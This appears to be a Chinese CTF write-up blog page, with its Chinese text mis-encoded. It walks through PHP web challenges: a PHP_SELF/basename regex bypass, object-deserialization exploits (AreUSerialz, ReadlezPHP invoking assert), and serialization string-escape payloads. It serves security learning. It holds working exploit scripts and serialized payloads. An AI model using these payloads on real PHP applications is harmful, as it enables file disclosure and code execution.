<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"I don't know what you are thinking, but I won't let you read it :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">&#123;</span> 
    <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token variable">$guess</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    <span class="token punctuation">&#123;</span>  
        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Congratulations! The flag is: '</span> <span class="token operator">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> 
    <span class="token punctuation">&#123;</span>  
        <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Wrong.'</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>çœ‹åˆ°<code>Congratulations! The flag is: &#39; . FLAG</code>ä½†æ˜¯ä»”ç»†æŸ¥çœ‹ï¼Œå‘ç°è¦ä½¿æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦å®Œå®Œå…¨å…¨ä¸random_bytes(64)ç›¸ç­‰ï¼Œæ˜¾ç„¶éš¾åº¦éå¸¸å¤§ï¼Œæˆ‘ä»¬æ¢æ¡è·¯ã€‚</p>
<p>æœ‰å‡ ä¸ªçŸ¥è¯†ç‚¹ï¼š</p>
<p>&#x3D;&#x3D;$_SERVER[â€˜PHP_SELFâ€™]&#x3D;&#x3D;ï¼šè¡¨ç¤ºå½“å‰ php æ–‡ä»¶ç›¸å¯¹äºç½‘ç«™æ ¹ç›®å½•çš„ä½ç½®åœ°å€ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">1. http:&#x2F;&#x2F;www.5idev.com&#x2F;php&#x2F;   						&#x2F;php&#x2F;index.php
2. http:&#x2F;&#x2F;www.5idev.com&#x2F;php&#x2F;index.php 				&#x2F;php&#x2F;index.php
3. http:&#x2F;&#x2F;www.5idev.com&#x2F;php&#x2F;index.php?test&#x3D;foo  	&#x2F;php&#x2F;index.php
4. http:&#x2F;&#x2F;www.5idev.com&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo  	&#x2F;php&#x2F;index.php&#x2F;test&#x2F;foo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>&#x3D;&#x3D;basename&#x3D;&#x3D;ï¼šè¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/testweb/home.php"</span><span class="token punctuation">;</span>

<span class="token comment">//æ˜¾ç¤ºå¸¦æœ‰æ–‡ä»¶æ‰©å±•åçš„æ–‡ä»¶å</span>
<span class="token keyword">echo</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>			<span class="token comment">//home.php</span>

<span class="token comment">//æ˜¾ç¤ºä¸å¸¦æœ‰æ–‡ä»¶æ‰©å±•åçš„æ–‡ä»¶å</span>
<span class="token keyword">echo</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//home</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flagåœ¨config.phpæ–‡ä»¶ä¸­,ä½†æ˜¯æ­£åˆ™åŒ¹é…æ‰äº†config.php</p>
<p>å½“è®¿é—®index.phpæ—¶ï¼Œå¯ä»¥åœ¨åé¢åŠ ä¸Šä¸€äº›ä¸œè¥¿ï¼Œä¾‹å¦‚&#x2F;index.php&#x2F;config.phpï¼Œè®¿é—®çš„ä»ç„¶æ˜¯index.phpã€‚ä½†ç»è¿‡basename()åï¼Œå°±å˜æˆäº†config.phpï¼Œç„¶åå†é€šè¿‡?sourceè¯»å–ã€‚</p>
<p>å¦‚æœèƒ½ç»•è¿‡æ­£åˆ™ï¼Œå°±å¯ä»¥è®¿é—®config.phpï¼Œè¿›è€Œå¾—åˆ°flag</p>
<p>å¦‚æœæ„é€ </p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;config.php?souce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ— æ³•ç»•è¿‡æ­£åˆ™åŒ¹é…</p>
<p>ç”¨ä¸å¯æ˜¾å­—ç¬¦ç»•è¿‡æ­£åˆ™ï¼ˆåé¢åŠ  %80 â€“ %ff çš„ä»»æ„å­—ç¬¦ï¼‰</p>
<p>æ„é€ payload:</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php&#x2F;config.php&#x2F;%ff?source<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>







<hr>
<h1 id="phpååºåˆ—åŒ–"><a href="#phpååºåˆ—åŒ–" class="headerlink" title="phpååºåˆ—åŒ–"></a>phpååºåˆ—åŒ–</h1><h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP</h4><p>?select&#x3D;O:4:â€Nameâ€:3:{s:14:â€%00Name%00usernameâ€;s:5:â€adminâ€;s:14:â€%00Name%00passwordâ€;i:100;}</p>
<hr>
<h4 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    
    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é¦–å…ˆçœ‹åˆ°æœ€åï¼Œéœ€è¦ä¼ å‚strï¼Œç„¶åè½¬ä¸ºå­—ç¬¦ä¸²ï¼Œä¼ å…¥is_validå‡½æ•°æ£€æŸ¥asciiç æ˜¯å¦æ˜¯ä½äº32~125ï¼Œç„¶åååºåˆ—ã€‚</p>
<p>ç„¶åçœ‹destructå‡½æ•°ï¼Œå®ƒä¼šåˆ¤æ–­opå±æ€§å€¼æ˜¯ä¸æ˜¯â€2â€ï¼Œæ˜¯â€2â€å°±æ”¹ä¸ºâ€1â€ï¼Œæ³¨æ„è¿™é‡Œæ˜¯å¼ºæ¯”è¾ƒï¼Œç„¶åè§¦å‘process()å‡½æ•°ã€‚</p>
<p>å‘ç°åœ¨readå‡½æ•°é‡Œæœ‰file_get_contentsè¯»æ–‡ä»¶çš„æ“ä½œï¼Œé‚£æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯åˆ©ç”¨è¿™ä¸ªå‡½æ•°è¯»å–flag.phpæ–‡ä»¶ã€‚</p>
<p>çœ‹åˆ°processå‡½æ•°ï¼Œè¦è§¦å‘readå‡½æ•°ï¼Œå°±è¦ä½¿opçš„å€¼ä¸ºâ€2â€ï¼Œè¿™é‡Œæ˜¯å¼±æ¯”è¾ƒã€‚</p>
<p>exp:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileHandler</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">public</span> <span class="token variable">$op</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/convert.base64-encode/resource=flag.php'</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡Œæœ‰ä¸¤ä¸ªç»†èŠ‚ï¼š</p>
<ol>
<li><p>opçš„å€¼æ˜¯2ï¼Œæ•°æ®ç±»å‹æ˜¯intï¼Œå’Œâ€œ2â€è¿›è¡Œå¼ºæ¯”è¾ƒç»“æœä¸ºå‡ï¼Œä¸â€œ2â€å¼±æ¯”è¾ƒç»“æœä¸ºçœŸï¼Œå®Œç¾ç»•è¿‡ã€‚</p>
</li>
<li><p>protectedæ”¹ä¸ºäº†publicï¼Œè¿™é‡Œæ˜¯å› ä¸ºis_validå‡½æ•°ä¼šè¿›è¡Œæ£€æŸ¥ï¼Œè€Œ%00çš„asciiç æ˜¯0ï¼Œé€šè¿‡ä¸äº†æ£€æŸ¥ï¼Œæ‰€ä»¥ä¸èƒ½å­˜åœ¨ç©ºå­—ç¬¦ä¸²ã€‚</p>
</li>
</ol>
<hr>
<h4 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h4><p>æŸ¥çœ‹æºä»£ç å‘ç°&#x2F;time.php?sourceæ–‡ä»¶ï¼Œè®¿é—®å®ƒã€‚</p>
<p>æ˜¯ä¸€é“ååºåˆ—åŒ–çš„é¢˜ï¼Œå…ˆçœ‹destructå‡½æ•°ï¼Œæœ€ç»ˆä¼šè¾“å‡ºb(a)ï¼Œæ‰€ä»¥è®©å˜é‡bä¸ºsystemï¼Œå˜é‡aä¸ºphpinfoï¼Œè¿™é‡Œsystemè¢«ç¦ç”¨ï¼Œç”¨&#x3D;&#x3D;assert&#x3D;&#x3D;ä»£æ›¿ï¼Œåºåˆ—åŒ–åpayloadï¼š</p>
<p>?data&#x3D;O:8:â€HelloPhpâ€:2:{s:1:â€aâ€;s:9:â€phpinfo()â€;s:1:â€bâ€;s:6:â€assertâ€;}</p>
<p>ctrl+fæŸ¥æ‰¾flag</p>
<hr>
<h4 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h4><p>å­¦åˆ°çš„çŸ¥è¯†ï¼šextractå¯¹sessionæ•°ç»„çš„è¦†ç›–</p>
<p>&#x3D;&#x3D;ååºåˆ—åŒ–é€ƒé€¸&#x3D;&#x3D;çš„æ–¹æ³•</p>
<p>å‚è€ƒé“¾æ¥ï¼š[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LLeaves/p/12813992.html">å®‰æ´µæ¯ 2019]easy_serialize_php - LLeaves - åšå®¢å›­ (cnblogs.com)</a></p>
<p>é¦–å…ˆä»£ç å®¡è®¡ï¼Œåœ¨phpinfoæ‰¾åˆ°d0g3_f1ag.phpæ–‡ä»¶</p>
<p>d0g3_f1ag.phpâ€”-base64åŠ å¯†â€”-&gt;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;</p>
<p>&#x2F;d0g3_fllllllagâ€”â€”base64åŠ å¯†â€”â€“&gt;L2QwZzNfZmxsbGxsbGFn</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token comment">#æ–¹æ³•ä¸€</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flagflag'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span><span class="token punctuation">;</span>
    <span class="token comment">#ç»“æœ a:1:&#123;s:8:"flagflag";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;";&#125;ï¼Œè¿™é‡Œå°±é€ æˆimgä¸æˆä¸ºä¸€ä¸ªé”®ï¼Œä¹Ÿå°±æ— æ³•è¿›è¡ŒåŠ å¯†</span>
    <span class="token comment">#è¿‡æ»¤æ‰flagæœ‰</span>
    <span class="token comment">#a:1:&#123;s:8:"";s:51:"";s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;";&#125;</span>
    <span class="token comment">#ä½¿å¾—ç»•è¿‡;s:51:""åˆ°è¾¾ä¸‹ä¸€ä¸ªå°å·ï¼Œè¿™æ—¶imgæˆåŠŸé€ƒé€¸å‡ºæ¥</span>

    <span class="token comment">#æ–¹æ³•äºŒ</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flagphp'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">';s:3:"aaa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span><span class="token punctuation">;</span>
   
    <span class="token comment">#æ–¹æ³•ä¸‰</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flagflag'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'";s:2:"aa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";&#125;'</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h4 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h4><p>&#x3D;&#x3D;ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸&#x3D;&#x3D;</p>
<p><a target="_blank" rel="noopener" href="http://www.zipä¸‹è½½æºç ,è®¿é—®regiest.phpæ³¨å†Œè´¦å·,ç„¶åç™»å½•,ç„¶åä»£ç å®¡è®¡./">www.zipä¸‹è½½æºç ï¼Œè®¿é—®regiest.phpæ³¨å†Œè´¦å·ï¼Œç„¶åç™»å½•ï¼Œç„¶åä»£ç å®¡è®¡ã€‚</a></p>
<p>æ‰“å¼€åï¼Œå¼€å§‹å®¡è®¡ï¼Œåæ­£æˆ‘æ˜¯ä¸ä¼š ã€‚å…¶å®åšçš„é¢˜å¤šäº†ï¼Œä¹Ÿå°±èƒ½å‘ç°ï¼Œæ¥æ¥å›å›ä¹Ÿå°±é‚£å‡ ä¸ªå‡½æ•°ã€‚æˆ‘ä»¬å¯ä»¥åœ¨config.phpé‡Œçœ‹è§flagï¼Œé‚£æˆ‘ä»¬åªè¦è¯»å–config.phpæ–‡ä»¶å³å¯ï¼Œç„¶åååœ¨profile.phpé‡Œçœ‹è§file_get_contents()å‡½æ•°ã€‚</p>
<p>åŸæ¥çš„åºåˆ—åŒ–ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">a:4:&#123;s:5:â€œphoneâ€;s:11:â€œ11111111111â€;s:5:â€œemailâ€;s:11:â€œ1a2s@qq.comâ€;s:8:â€œnicknameâ€;s:3:â€œ123â€;s:5:â€œphotoâ€;s:39:â€œupload&#x2F;f3b94e88bd1bd325af6f62828c8785ddâ€;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

